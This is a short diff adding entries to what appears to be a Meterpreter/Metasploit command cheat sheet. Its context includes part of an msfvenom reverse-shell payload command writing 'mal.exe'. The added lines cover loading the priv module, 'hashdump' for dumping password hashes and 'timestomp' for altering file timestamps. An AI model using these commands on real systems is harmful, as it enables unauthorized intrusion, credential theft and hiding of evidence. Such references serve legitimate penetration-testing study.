@@ -182,3 +182,15 @@ exe LHOST=192.168.1.1 LPORT=4444 > mal.exe
     - `uictl [enable/disable] [keyboard/mouse]` : Enable/disable either the mouse or keyboard of the target machine.
 
     - `screenshot` : Save as an image a screenshot of the target machine.
+
+- ##### Additional Modules:
+
+  - `use [module]` : Load the specified module
+    
+    - Examples:
+
+      -  `use priv` : Load the priv module
+
+      - `hashdump` : Dump the hashes from the box
+
+      - `timestomp` : Alter NTFS file timestamps
